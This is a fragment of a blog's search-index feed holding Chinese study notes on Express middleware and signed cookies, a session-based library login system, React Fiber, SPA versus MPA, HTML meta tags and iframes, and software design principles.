&#125;)app.post(&apos;/login.do&apos;, jsonParser, (req, res) =&gt; &#123; console.log(&apos;********************&apos;) console.log(req.body) res.end();&#125;) 加载到没有挂载路径的中间件1234// parse application/x-www-form-urlencodedapp.use(bodyParser.urlencoded(&#123; extended: false &#125;))// parse application/jsonapp.use(bodyParser.json()) Cookie-parser方便操作客户端中的cookie值 Express完成cookie值的签名，cookie-parser实现签名cookie的解析。两者共用同一个秘钥。 签名前的cookie值为chyingp，签名后的cookie值为s%3Achyingp.uVofnk6k%2B9mHQpdPlQeOfjM8B5oa6mppny9d%2BmG9rD0，decode后为s:chyingp.uVofnk6k+9mHQpdPlQeOfjM8B5oa6mppny9d+mG9rD0。 出于安全的考虑，我们通常需要对cookie进行签名。 1234567891011121314151617181920var express = require(&apos;express&apos;);var cookieParser = require(&apos;cookie-parser&apos;);var app = express();// 初始化中间件，传入的第一个参数为singed secret 签名app.use(cookieParser(&apos;secret&apos;));app.use(function (req, res, next) &#123; console.log(req.cookies.nick); // chyingp console.log(req.signedCookies.nick); // chyingp next();&#125;);app.use(function (req, res, next) &#123; // 传入第三个参数 &#123;signed: true&#125;，表示要对cookie进行摘要计算 res.cookie(&apos;nick&apos;, &apos;chyingp&apos;, &#123;signed: true&#125;); res.end(&apos;ok&apos;);&#125;);app.listen(3000); 例子改写如下，有几个注意点： cookieParser初始化时，传入secret作为签名的秘钥。 设置cookie时，将signed设置为true，表示对即将设置的cookie进行签名。 获取cookie时，可以通过req.cookies，也可以通过req.signedCookies获取。 “解析”签名cookie阶段，中间件主要做了两件事： 将签名cookie对应的原始值提取出来 验证签名cookie是否合法 cookie签名的作用 主要是出于安全考虑，防止cookie被篡改，增强安全性。 假设网站通过nick这个cookie来区分当前登录的用户是谁。在前面例子中，登录用户的cookie中，nick对应的值如下：(decode后的) 1s:chyingp.uVofnk6k+9mHQpdPlQeOfjM8B5oa6mppny9d+mG9rD0 此时，有人试图修改这个cookie值，来达到伪造身份的目的。比如修改成xiaoming： 1s:xiaoming.uVofnk6k+9mHQpdPlQeOfjM8B5oa6mppny9d+mG9rD0 当网站收到请求，对签名cookie进行解析，发现签名验证不通过。由此可判断，cookie是伪造的。 1hmac(&quot;xiaoming&quot;, &quot;secret&quot;) !== &quot;uVofnk6k+9mHQpdPlQeOfjM8B5oa6mppny9d+mG9rD0&quot; 签名就一定能够确保安全吗 当然不是。 上个小节的例子，仅通过nick这个cookie的值来判断登录的是哪个用户，这是一个非常糟糕的设计。虽然在秘钥未知的情况下，很难伪造签名cookie。但用户名相同的情况下，签名也是相同的。这种情况下，其实是很容易伪造的。 express.static设置静态文件路径的中间件 1app.use(express.static(&apos;public&apos;)); HLayer.jshttps://github.com/huruji/Hlayer https://www.jianshu.com/p/662908ec7713 made by Huruji, web弹层组件 重要部分1.express 中有两个对象可用于模板的渲染：app.locals 和 res.locals 除了get方法中使用render来向ejs模版传递参数，还可以用locals对象的属性为view提供变量。 在调用 res.render 的时候，express 合并（merge）了 3 处的结果后传入要渲染的模板，优先级：res.render 传入的对象&gt; res.locals 对象 &gt; app.locals 对象，所以 app.locals 和 res.locals 几乎没有区别，都用来渲染模板，使用上的区别在于：app.locals 上通常挂载常量信息（如博客名、描述、作者信息），res.locals 上通常挂载变量信息，即每次请求可能的值都不一样（如请求者信息，res.locals.user = req.session.user）。 2.RESTful API 接口规范 1）URI URI 表示资源，资源一般对应服务器端领域模型中的实体类。 URI规范 不用大写；用中杠-不用下杠_；参数列表要encode；URI中的名词表示资源集合，使用复数形式。 2）Request HTTP方法通过标准HTTP方法对资源CRUD 3）等等等等 登录系统流程第一步，用户访问网站(未登录)，生成空的session，通过cookie记录sessionid 1234if(!req.session.userID || !req.session.userSign)&#123; res.redirect(&quot;/hopelibrary/user/login&quot;); return;&#125; 第二步，用户跳转到登录页面：这个页面会向后端验证码接口发送一个请求，服务器根据此时用户的cookie中记录的sessionid找到前面生成的空session，生成一个验证码 1234session&#123; sessionId: checkcode:&#125; 第三步，用户填写完用户信息，点击提交，表单信息包括 会被发送到服务器，服务器首先根据用户请求中用户的cookie中的sessionid，找到设置的验证码，和前端发送的验证码进行比对，若一致，则继续进行账号密码验证登录，若不一致则返回错误 第四步，建立与mysql数据库的连接，查询用户库，返回结果存在则设置cookie和session并设置信息 123456789101112131415res.cookie(&quot;userId&quot;, rows[0].readerID, &#123; maxAge: 30 * 60 * 1000, path: &apos;/&apos;,&#125;);const message = &#123; code: 0, message: &quot;成功&quot;, userId: user.readerID&#125;;setSession(req, &#123;userID: user.readerID, userSign: true&#125;);function setSession(req,options) &#123; for(let a in options) &#123; req.session[a] = options[a]; &#125;&#125; 第五步，验证码验证通过，验证登录，将用户信息存入session，用户变为登录状态。 123456session&#123; sessionId: checkcode: userID: user.readerID userSign: true&#125; 如果存在session跳转到正常页面 1234if(req.session.userSign) &#123; res.redirect(&apos;/hopelibrary/user&apos;); return;&#125; 验证码captchapng组件 12345678910111213141516171819202122232425exports.captchap=function (req, res, next) &#123; //设置宽高 var width=!isNaN(parseInt(req.query.width))?parseInt(req.query.width):100; var height=!isNaN(parseInt(req.query.height))?parseInt(req.query.height):48; //生成随机数 var code = parseInt(Math.random()*9000+1000); //设置为session中的值 req.session.checkcode = code; //生成图片 var p = new captchapng(width,height, code); p.color(0, 0, 0, 0); p.color(80, 80, 80, 255); var img = p.getBase64(); var imgbase64 = new Buffer(img,&apos;base64&apos;); //响应头 响应类型图片 res.writeHead(200, &#123; &apos;Content-Type&apos;: &apos;image/png&apos; &#125;); res.end(imgbase64);&#125;const captchap=require(&quot;./checkcode&quot;).captchap;router.route(&quot;/checkcode&quot;).get(function(req, res) captchap(req,res);&#125;);//验证码 加密crypto组件进行md5加密 升级安全方面token 考虑到网站安全的问题，用户做任何操作的时候都要验证session。session的生命周期决定这种方式也不是绝对安全的，假如用户已经登录了，攻击者截取到了用户发送到服务器的请求，用请求里的sessionid,去做其他操作，只要被截取的用户在线，服务器上这个session没有过期，那操作都能成功 数据交互db-common.js 拼接mysql查询字符串 连接数据库 定义操作方法 123456789function operate(connect, table)&#123; this.table = table; this.connection = connect;&#125;operate.prototype.selectAll = function(callback) &#123; const action = &apos;SELECT * &apos; + &apos;FROM &apos; + this.table; console.log(&apos;action:&apos;+action); this.connection.query(action, callback)&#125;; hopeDB.js 继承operate，并绑定具体数据库 实现数据库方法库 12345678910111213const connection = mysqlUtil.DBConnection;const adminOperate = new dbCommon.operate(connection, &apos;hopeadmin&apos;);const adminDB = &#123; selectAll: (callback) =&gt; &#123; adminOperate.selectAll((err, rows, fields) =&gt; &#123; if(err)&#123; console.log(err); return; &#125; callback&amp;&amp;callback(rows); &#125;); &#125;,&#125; 具体页面 调用方法 12userDB.selectAll((rows) =&gt; &#123;&#125;) 封装当你需要隐藏一些属性和方法时，就可以将这些属性和方法封装起来，然后通过一个外部可以调用的特定接口（也可以说是一个公共的方法）进行调用。 防止代码冗余,也可以方便代码的调用,同时也可以防止不必要的错误。 安全？ 页面渲染ejs模板，res.render获得相关信息 1res.render(&quot;user/user-book&quot;,&#123;userName,userImg,userPermission,firstPath:&apos;borrow&apos;,secondPath:&apos;&apos;,book,bookCate,bookNum,bookPage:pageNum&#125;); 鉴权系统利用服务器端的session（会话）和浏览器端的cookie来实现前后端的认证 不同管理权限用户入口不同 1234&#123; adminID:admin.adminID, adminSign: true&#125; https://blog.csdn.net/weixin_40442219/article/details/83377530 附录：项目结构1. 目录结构HopeLibrarySystem-master 项目文件 bin pm2配置信息 git_images node_modules public 公共css、js、图片（图书封面、设备、用户头像和其他图片） css main.css 主要css img admin 用户头像 book 图书封面 equip 设备图片 user 用户头像 js admin-super adduser.js data charts.config.js hlayer hlayer.css hlayer.js layer public user favicon.ico routes api api-book-borrow.js api-book.js api-equip.js api-login.js api-user.js admin-book.js admin-equip.js admin-super.js admin.js book.js checkcode.js email-schedule.js equip.js mysql_util.js public.js user.js utils views 各页面ejs api.md app.js config.js hopeWechat.sql lib.log package-lock.json package.json README.md 2. 数据库结构bookborrow 记录借阅书籍情况 ​ borrowID 借阅序号 ​ borrowBookID 被借阅书ID ​ borrowUserID 借阅者ID ​ borrowTime 借阅时间 ​ returnWhe ​ returnBefore 预定归还时间 equipborrow 记录借用设备情况 ​ borrowID 借用序号 ​ borrowEquipID 被借用设备ID ​ borrowUserID 借用者ID ​ borrowTime 借用时间 ​ returnWhe ​ returnBefore 预定归还时间 ​ reservation 是否审核通过 ​ reservationText 借用理由 hopeadmin 记录管理员信息 ​ adminID 管理员ID ​ adminName 管理员名字 ​ adminPassword 管理员密码 ​ adminEmail 管理员邮件 ​ adminImgSrc 管理员头像路径 ​ adminPermissions 管理员权限 hopebook 记录书籍信息 ​ bookID 书ID ​ bookImgSrc 书封面路径 ​ bookName 书名 ​ bookHopeID 书Hope编号 ​ bookAuthor 书作者 ​ bookISBN 书ISBN ​ bookPress 书出版社 ​ bookCate 书类目 ​ bookLeft 是否被借阅 hopeequip 记录设备信息 ​ equipID 设备ID ​ equipHopeID 设备Hope编号 ​ equipName 设备名 ​ equipImgSrc 设备图片路径 ​ equipAdminID 设备管理员ID ​ equipLeft 是否被借用 hopereader 记录用户信息 ​ readerID 用户ID ​ readerName 用户名字 ​ readerPassword 用户密码 ​ readerSex 用户性别 ​ readerGroup 用户兴趣组 ​ studentNumber 用户学号 ​ readerMajor 用户专业 ​ readerPhone 用户电话 ​ readerEmail 用户邮箱 ​ readerBadNum ​ userImgSrc 用户头像路径 https://www.cnblogs.com/chenchenluo/p/4197181.html https://blog.csdn.net/q809198545/article/details/79692483 https://www.cnblogs.com/mingjiatang/p/7495321.html https://www.jianshu.com/p/ff6763c7d823 https://www.cnblogs.com/chyingp/p/express-cookie-parser-deep-in.html https://www.jianshu.com/p/136a95f5bdc6]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_React%2F</url>
    <content type="text"><![CDATA[前言 生命周期 React Fiber 在React Fiber之前的版本，当React决定要加载或者更新组件树时，会做很多事，但主要是两个阶段： 调度阶段（Reconciler）：这个阶段React用新数据生成新的Virtual DOM，遍历Virtual DOM，然后通过Diff算法，快速找出需要更新的元素，放到更新队列中去。 渲染阶段（Renderer）：这个阶段React 根据所在的渲染环境，遍历更新队列，将对应元素更新。在浏览器中，就是跟新对应的DOM元素。除浏览器外，渲染环境还可以是 Native、硬件、VR 、WebGL等等。 React之前的调度策略Stack Reconciler。这个策略像函数调用栈一样，会深度优先遍历所有的Virtual DOM节点，进行Diff。它一定要等整棵Virtual DOM计算完成之后，才将任务出栈释放主线程。而浏览器中的渲染引擎是单线程的，除了网络操作,几乎所有的操作都在这个单线程中执行：解析渲染DOM tree和CSS tree、解析执行JavaScript，这个线程就是浏览器的主线程。 React Fiber解决过去Reconciler存在的问题的思路是把渲染/更新过程（递归diff）拆分成一系列小任务，每次检查树上的一小部分，完成后确认否还有时间继续下一个任务，存在时继续，不存在下一个任务时自己挂起，主线程不忙的时候再继续。 React Fiber将组件的递归更新，改成链表的依次执行，扩展出了fiber tree，即Fiber上下文的Virtual DOM tree，更新过程根据输入数据以及现有的fiber tree构造出新的fiber tree（workInProgress tree）。 fiber tree实际上是个单链表（Singly Linked List）树结构。Fiber的拆分单位是fiber tree上的一个节点fiber，按Virtual DOM节点拆，因为fiber tree是根据Virtual DOM tree构造出来的，树结构一模一样，只是节点携带的信息有差异。所以，实际上Virtual DOM node粒度的拆分以fiber为工作单元，每个组件实例和每个DOM节点抽象表示的实例都是一个工作单元。工作循环中，每次处理一个fiber，处理完可以中断/挂起整个工作循环。 reconcile React Fiber把渲染/更新过程分为两个阶段： 1）可中断的render/reconciliation 通过构造workInProgress tree得出change。 2）不可中断的commit 应用这些DOM change。 第一阶段render/reconciliation具体实现为以fiber tree为蓝本，把每个fiber作为一个工作单元，自顶向下逐节点构造workInProgress tree（构建中的新fiber tree）。 以组件节点为例，具体过程如下： 1）如果当前节点不需要更新，直接把子节点clone过来，跳到5；要更新的话打个tag。 2）更新当前props， state， context等节点状态。 3）调用should Component Update()，false的话，跳到5。 4）调用render()获得新的子节点，并为子节点创建fiber。创建过程会尽量复用现有fiber，子节点增删也发生在这里。 5）如果没有产生child fiber，该工作单元结束，把effect list归并到return，并把当前节点的sibling作为下一个工作单元；否则把child作为下一个工作单元。 6）如果没有剩余可用时间了，等到下一次主线程空闲时才开始下一个工作单元；否则，立即开始做。 7）如果没有下一个工作单元了，回到了workInProgress tree的根节点，第1阶段结束，进入pending Commit状态。 实际上是1-&gt;6的工作循环，7是出口，工作循环每次只做一件事，做完看要不要休息。工作循环结束时，因为每做完一个都向上归并，workInProgress tree根节点身上的effect list就是收集到的所有side effect。 所以，构建workInProgress tree的过程就是diff的过程，通过request Idle Callback来调度执行一组任务，每完成一个任务后回来看看有没有插队的（更紧急的），每完成一组任务，把时间控制权交还给主线程，直到下一次request Idle Callback回调再继续构建workInProgress tree。 这一阶段是没有副作用的，因此这个过程可以被打断，然后恢复执行。 第二阶段commit：第一阶段产生的effectlist只有在commit之后才会生效，也就是真正应用到DOM中。这一阶段往往不会执行太长时间，因此是同步（所谓的一次性）的，这样也避免了组件内视图层结构和DOM不一致。 生命周期 因为render/reconciliation阶段可能执行多次，会导致willXXX钩子执行多次。所以getDerivedStateFromProps取代了原本的componentWillMount与componentWillReceiveProps方法，而componentWillUpdate本来就是可有可无所以也被废弃了。 进入commit阶段时，组件多了一个新钩子叫getSnapshotBeforeUpdate，它与commit阶段的钩子一样只执行一次。 出错时，在componentDidMount/Update后，可以使用componentDidCatch方法。 HOChttps://zhuanlan.zhihu.com/p/49485308 https://zhuanlan.zhihu.com/p/39992552]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FSPA%2F</url>
    <content type="text"><![CDATA[前言 SPA与MPA对比SPA单页面的优点：1，用户体验好，快，内容的改变不需要重新加载整个页面，基于这一点spa对服务器压力较小 2，前后端分离 3，页面效果会比较炫酷（比如切换页面内容时的专场动画） 单页面缺点：1，不利于seo 2，导航不可用，如果一定要导航需要自行实现前进、后退。（由于是单页面不能用浏览器的前进后退功能，所以需要自己建立堆栈管理） 3，初次加载时耗时多 4，页面复杂度提高很多 使用SPA降低响应时间和硬件成本单页面APP尝试解决性能差和提高转换率的问题。他们可以大幅节省硬件成本等等。让我们来调查SPA可带来的所有好处。 速度和响应速度对于单页面APP，服务器无需在每次交互时重新加载大多数资源，例如HTML，CSS和脚本。这些文件只需要初始加载。之后，只有新的数据从服务器上下载。此外，SPA仅重新加载部分内容，因此它们的服务器负载较轻。这就是为什么这些APP允许在APP中进行快速交互 由于将数据处理从服务器移动到浏览器，SPA还缩短了响应时间。 适应性在开发移动APP时，SPA为您带来了相当大的安慰：您可以为移动APP重新使用基于Web的APP的相同后端代码。这对于多页面APP来说非常困难。此外，与网站相比，SPA更像是APP，因此您无需专门针对移动设备的SPA设计或功能进行调整。 灵活的UI除了一些静态资源文件外，您可以完全重写单页APP的前端，而不会影响服务器。 脱机支持和缓存单页面APP可以缓存到任何具有分派的本地存储。这种类型的APP向服务器发送一个请求，然后存储它收到的所有数据。APP可以使用这些数据。这就是为什么即使您的设备失去连接性，SPA也可以在离线状态下运行，与MPA不同，所以您可以继续使用它。只要连接返回，本地数据就会与服务器同步。 能够分离数据和UI单页面APP能够区分数据和用户界面。这在开发WebAPP时可以相当有助于简化测试。此外，这样的区别允许您处理未来的所有集成和可能的数据如何进入SPA框架的变化，并转到其他系统，而不会对接口产生重大影响。 - 单页面应用（SinglePage Web Application，SPA） 多页面应用（MultiPage Application，MPA） 组成 一个外壳页面和多个页面片段组成 多个完整页面构成 资源共用(css,js) 共用，只需在外壳部分加载 不共用，每个页面都需要加载 刷新方式 页面局部刷新或更改 整页刷新 url 模式 a.com/#/pageone a.com/#/pagetwo a.com/pageone.html a.com/pagetwo.html 用户体验 页面片段间的切换快，用户体验良好 页面切换加载缓慢，流畅度不够，用户体验比较差 转场动画 容易实现 无法实现 数据传递 容易 依赖 url传参、或者cookie 、localStorage等 搜索引擎优化(SEO) 需要单独方案、实现较为困难、不利于SEO检索 可利用服务器端渲染(SSR)优化实现方法简易 试用范围 高要求的体验度、追求界面流畅的应用 适用于追求高度支持搜索引擎的应用 开发成本 较高，常需借助专业的框架 较低 ，但页面重复代码多 维护成本 相对容易 相对复杂 http://blog.sina.com.cn/s/blog_18186755f0102xiyt.html https://juejin.im/post/5a0ea4ec6fb9a0450407725c]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_html%2F</url>
    <content type="text"><![CDATA[前言 zibi 123456789101112131415&lt;meta/&gt; 头部元素&lt;base/&gt; 标签为页面上的所有链接规定默认地址或默认目标。&lt;br/&gt; 换行&lt;hr/&gt; 分隔线&lt;area/&gt; 标签定义图像映射中的区域(注:图像映射指得是带有可点击区域的图像)。area 元素总是嵌套在 标签中&lt;img/&gt; 图片&lt;input&gt; 输入框&lt;link/&gt; 链接&lt;param/&gt; 插入 XHTML 文档的对象规定 run-time 设置&lt;col/&gt; 表格中一个或多个列定义属性值&lt;frame/&gt; frameset中的一个特定的窗口&lt;object/&gt; 或者标签提供参数&lt;embed/&gt; HTML5 中新增的,标签定义了一个容器，用来嵌入外部应用或者互动程序（插件）&lt;keygen&gt; 该对象提供了一个安全的方式来验证用户。&lt;source&gt; 标签为媒体元素（比如 和 ）定义媒体资源。 manifest 属性规定文档的缓存 manifest 的位置。 HTML5 引入了应用程序缓存，这意味着 Web 应用程序可以被缓存，然后在无互联网连接的时候进行访问。 应用程序缓存使得应用程序有三个优点： 离线浏览 - 用户可以在离线时使用应用程序 快速 - 缓存的资源可以更快地加载 减少服务器加载 - 浏览器只从服务器上下载已更新/已更改的资源 manifest 属性应该被 Web 应用程序中您想要缓存的每个页面包含。 manifest 文件是一个简单的文本文件，列举出了浏览器用于离线访问而缓存的资源。 metaHTML 元素表示那些不能由其它HTML元相关元素 (, , , 或 ) 之一表示的任何元数据信息. 允许的父元素&lt;meta charset&gt;, &lt;meta http-equiv&gt;, 元素 charset 此特性声明当前文档所使用的字符编码，但该声明可以被任何一个元素的 lang 特性的值覆盖。鼓励使用 UTF-8 1&lt;meta charset="utf-8"&gt; content 必需的属性 此属性包含http-equiv 或name 属性的值，具体取决于所使用的值。 http-equiv 把 content 属性关联到 HTTP 头部。 这个枚举属性定义了能改变服务器和用户引擎行为的编译。这个编译值使用content 来定 content-type expires refresh set-cookie 使用带有 http-equiv 属性的 标签时，服务器将把名称/值对添加到发送给浏览器的内容头部。例如，添加： 12&lt;meta http-equiv=&quot;charset&quot; content=&quot;iso-8859-1&quot;&gt;&lt;meta http-equiv=&quot;expires&quot; content=&quot;31 Dec 2008&quot;&gt; 这样发送到浏览器的头部就应该包含： 123content-type: text/htmlcharset:iso-8859-1expires:31 Dec 2008 当然，只有浏览器可以接受这些附加的头部字段，并能以适当的方式使用它们时，这些字段才有意义。 “content-security-policy”内容安全策略 它允许页面作者定义当前页的 内容策略。 内容策略主要指定允许的服务器源和脚本端点，这有助于防止跨站点脚本攻击。 default-style 这个属性指定了在页面上使用的首选样式表. content属性必须包含 元素的标题, href属性链接到CSS样式表或包含CSS样式表的元素的标题. refresh 这个属性指定: 如果content 只包含一个正整数,则是重新载入页面的时间间隔(秒); 如果content 包含一个正整数并且跟着一个字符串,则是重定向到指定链接的时间间隔(秒) 12&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;&lt;meta http-equiv="refresh" content="3;url=http://www.mozilla.org/"&gt; name 把 content 属性关联到一个名称。 author description keywords generator revised others name 属性提供了名称/值对中的名称。HTML 和 XHTML 标签都没有指定任何预先定义的 名称。通常情况下，您可以自由使用对自己和源文档的读者来说富有意义的名称。 “keywords” 是一个经常被用到的名称。它为文档定义了一组关键字。某些搜索引擎在遇到这些关键字时，会用这些关键字对文档进行分类。 类似这样的 meta 标签可能对于进入搜索引擎的索引有帮助： 1&lt;meta name=&quot;keywords&quot; content=&quot;HTML,ASP,PHP,SQL&quot;&gt; 如果没有提供 name 属性，那么名称/值对中的名称会采用 http-equiv 属性的值。 该属性定义文档级元数据的名称。如果以下其中一个属性设置了itemprop, http-equiv or charset ，就不能在设置这个属性了。 此元数据名称与 属性包含的值相关联。name属性的可能值为： 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&quot;&gt; viewport, 它提供有关视口初始大小的提示，仅供移动设备使用。值的内容为： Value可能值描述width一个正整数或者字符串 device-width以pixels（像素）为单位， 定义viewport（视口）的宽度。 height一个正整数或者字符串 device-height以pixels（像素）为单位， 定义viewport（视口）的高度。 initial-scale一个0.0 到10.0之间的正数定义设备宽度（纵向模式下的设备宽度或横向模式下的设备高度）与视口大小之间的缩放比率。 maximum-scale一个0.0 到10.0之间的正数定义缩放的最大值；它必须大于或等于minimum-scale的值，不然会导致不确定的行为发生。 minimum-scale一个0.0 到10.0之间的正数定义缩放的最小值；它必须小于或等于maximum-scale的值，不然会导致不确定的行为发生。 user-scalable一个布尔值（yes或者no）如果设置为 no，用户将不能放大或缩小网页。默认值为 yes。 https://www.cnblogs.com/2050/p/3877280.html h5 在存储方面提供了sessionStorage 、localStorage和离线存储，通过这些存储方式方便数据在客户端的存储和获取，在多媒体方面规定了音频和视频元素audio和vedio； 另外还有地理定位、canvas画布、拖放、多线程编程的web workers和websocket协议 H5 canvas SVG iframes我们会经常使用iframes来加载第三方的内容、广告或者插件。使用iframe是因为它可以和主页面并行加载，不会阻塞主页面。 一、使用iframe的优缺点优点:1.程序调入静态页面比较方便;2.页面和程序分离;缺点：1.iframe有不好之处：样式/脚本需要额外链入，会增加请求。另外用js防盗链只防得了小偷，防不了大盗。2.iframe好在能够把原先的网页全部原封不动显示下来,但是如果用在首页,是搜索引擎最讨厌的.那么你的网站即使做的在好,也排不到好的名次!如果是动态网页，用include还好点！但是必须要去除他的标签！3.框架结构有时会让人感到迷惑，特别是在多个框架中都出现上下、左右滚动条的时候。这些滚动条除了会挤占已经特别有限的页面空间外，还会分散访问者的留心力。访问者遇到这种站点往往会立刻转身离开。他们会想，既然你的主页如此混乱，那么站点的其他部分也许更不值得阅读。4.链接导航疑问。运用框架结构时，你必须保证正确配置所有的导航链接，如不然，会给访问者带来很大的麻烦。比如被链接的页面出现在导航框架内，这种情况下访问者便被陷住了，因为此时他没有其他地点可去。5.调用外部页面,需要额外调用css,给页面带来额外的请求次数; 主页面和iframe共享同一个连接池 iframe会阻塞主页面的onload事件 window 的 onload 事件需要在所有 iframe 加载完毕后(包含里面的元素)才会触发。在 Safari 和 Chrome 里，通过 JavaScript 动态设置 iframe 的 SRC 可以避免这种阻塞情况。 怎样做到iframe无阻塞加载onload？ Meebo的两个工程师(@marcuswestin and Martin Hunt)做了一个关于他们的Meebo Bar的演讲。他们使用iframe来加载一些插件，并且真正做到了无阻塞加载。对于有的开发者来说，他们的做法还比较新鲜。很赞，超级赞。 123456&lt;script&gt; (function(d) &#123; var iframe = d.body.appendChild(d.createElement('iframe')), doc = iframe.contentWindow.document; // style the iframe with some CSS iframe.style.cssText ="position:absolute;width:200px;height:100px;left:0px;"; doc.open().write('&lt;body οnlοad="'+ 'var d = document;d.getElementsByTagName(\'head\')[0].'+ 'appendChild(d.createElement(\'script\')).src'+'=\'\/path\/to\/file\'"&gt;'); doc.close(); //iframe onload event happens &#125;)(document);&lt;/script&gt; 神奇的地方就在:这个iframe一开始没有内容，所以onload会立即触发。然后你创建一个script元素，用他来加载内容、广告、插件什么的，然后再把这个script添加到HEAD中去，这样iframe内容的加载就不会阻塞主页面的onload！L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false}); https://blog.csdn.net/fs821031547/article/details/51821095]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_Vue%2F</url>
    <content type="text"><![CDATA[前言]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FdesignPattern%2F</url>
    <content type="text"><![CDATA[前言 设计模式软件模式是将模式的一般概念应用于软件开发领域，即软件开发的 总体指导思路或参照样板。软件模式并非仅限于设计模式，还包括 架构模式、分析模式和过程模式等，实际上，在软件生存期的每一个阶段都存在着一些被认同的模式。 什么是设计模式UML类图·类图结构为&lt;&gt;，表示为一个抽象类；·继承类和抽象类之间的关系为实现关系，使用带空心箭头的虚线表示；·继承类与实例之间是继承关系，它们之间的关系为泛化关系，使用带空心箭头的实线表示；·实例与实例部件之间是组合关系，使用带实心箭头的实线表示；·实例与用户之间是一种依赖关系，使用带箭头的虚线表示；·用户与用户群之间是聚合关系，使用带空心箭头的实线表示；·用户与身份证明之间为关联关系，使用一根实线表示； 类之间的关系继承关系实例-&gt;继承类-&gt;抽象类 泛化 实现 个体和集体的关系聚合 弱依赖组合 强依赖 不同类对象之间关系关联是静态强关联关系，描述不同类的对象之间的结构关系，对象常通过成员变量实现，依赖是临时性关系，描述一个对象运行期间会要到另一个对象的关系，尽量单向依赖 时序图时序图是显示对象之间交互的图，这些对象是按时间顺序排列的。时序图中显示的是参与交互的对象及其对象之间消息交互的顺序。 时序图（Sequence Diagram）包括的建模元素主要有：对象（Actor）、生命线（Lifeline）、控制焦点（Focus of control）、消息（Message）等等。 六大设计原则1)单一职责原则该原则是针对类来说的，即一个类应该只负责一项职责。如类T负责两个不同职责：职责P1，职责P2。当职责P1需求变更而改变T时，可能造成职责P2发生故障，所以需要将类T的粒度分解为T1，T2。遵循单一职责的优点： a)降低类的复杂度，一个类只负责一项职责。 b)提高类的可读性，可维护性 v)降低变更引起的风险。 2)里氏替换原则如果对每个类型为T1的对象o1，都有类型为T2的对象o2，使得以T1定义的所有程序P在所有的对象o1都代换成o2时，程序P的行为没有发生变化，那么类型T2是类型T1的子类型。换句话说，所有引用基类的地方必须能透明地使用其子类的对象。 由定义可知，在使用继承时，遵循里氏替换原则，在子类中尽量不要重写和重载父类的方法。继承包含这样一层含义：父类中凡是已经实现好的方法（相对抽象方法而言），实际上是在设定一系列的规范和契约，虽然它不强制要求所有的子类必须遵循这些契约，但是如果子类对这些非抽象方法任意修改，就会对整个继承体系造成破坏。而里氏替换原则就是表达了这一层含义。继承作为面向对象三大特性之一，在给程序设计带来巨大遍历的同时，也带来了弊端。比如使用继承会给程序带来侵入性，程序的可移植性降低，增加对象间的耦合性，如果一个类被其他的类所继承，则当这个类需要修改时，必须考虑到所有的子类，并且父类修改后，所有涉及到子类的功能都有可能产生故障。 3)依赖倒转原则程序要依赖于抽象接口，不要依赖于具体实现。高层次的模块不应该依赖于低层次的模块，他们都应该依赖于抽象。抽象不应该依赖于具体，具体应该依赖于抽象。简单的说就是要求对抽象进行编程，不要对实现进行编程，这样就降低了客户与实现模块间的耦合。 4)接口隔离原则客户端不应该依赖它不需要的接口；一个类对另一个类的依赖应该建立在最小的接口上。 5)迪米特法则一个软件实体应当尽可能少的与其他实体发生相互作用。每一个软件单位对其他的单位都只有最少的知识，而且局限于那些与本单位密切相关的软件单位。迪米特法则的初衷在于降低类之间的耦合。由于每个类尽量减少对其他类的依赖，因此，很容易使得系统的功能模块功能独立，相互之间不存在（或很少有）依赖关系。设计模式的门面模式（Facade）和中介模式（Mediator），都是迪米特法则应用的例子。 6)开闭原则开闭原则（OCP）是面向对象设计中“可复用设计”的基石，是面向对象设计中最重要的原则之一，其它很多的设计原则都是实现开闭原则的一种手段。对于扩展是开放的，对于修改是关闭的，这意味着模块的行为是可以扩展的。当应用的需求改变时，我们可以对模块进行扩展，使其具有满足那些改变的新行为。也就是说，我们可以改变模块的功能。对模块行为进行扩展时，不必改动模块的源代码或者二进制代码。 创建型模式创建型模式对类的实例化过程进行了抽象，能够将对象的创建与对象的使用过程分离。 简单工厂模式在简单工厂模式中，可以根据参数的不同返回不同类的实例。简单工厂模式专门定义一个类来负责创建其他类的实例，被创建的实例通常都具有共同的父类。 简单工厂模式包含如下角色：Factory：工厂角色工厂角色负责实现创建所有实例的内部逻辑Product：抽象产品角色抽象产品角色是所创建的所有对象的父类，负责描述所有实例所共有的公共接口ConcreteProduct：具体产品角色具体产品角色是创建目标，所有创建的对象都充当这个角色的某个具体类的实例。 模式分析将对象的创建和对象本身业务处理分离可以降低系统的耦合度，使得两者修改起来都相对容易。在调用工厂类的工厂方法时，由于工厂方法是静态方法，使用起来很方便，可通过类名直接调用，而且只需要传入一个简单的参数即可，在实际开发中，还可以在调用时将所传入的参数保存在XML等格式的配置文件中，修改参数时无须修改任何源代码。简单工厂模式最大的问题在于工厂类的职责相对过重，增加新的产品需要修改工厂类的判断逻辑，这一点与开闭原则是相违背的。简单工厂模式的要点在于：当你需要什么，只需要传入一个正确的参数，就可以获取你所需要的对象，而无须知道其创建细节。 简单工厂模式的优点工厂类含有必要的判断逻辑，可以决定在什么时候创建哪一个产品类的实例，客户端可以免除直接创建产品对象的责任，而仅仅“消费”产品；简单工厂模式通过这种做法实现了对责任的分割，它提供了专门的工厂类用于创建对象。客户端无须知道所创建的具体产品类的类名，只需要知道具体产品类所对应的参数即可，对于一些复杂的类名，通过简单工厂模式可以减少使用者的记忆量。通过引入配置文件，可以在不修改任何客户端代码的情况下更换和增加新的具体产品类，在一定程度上提高了系统的灵活性。 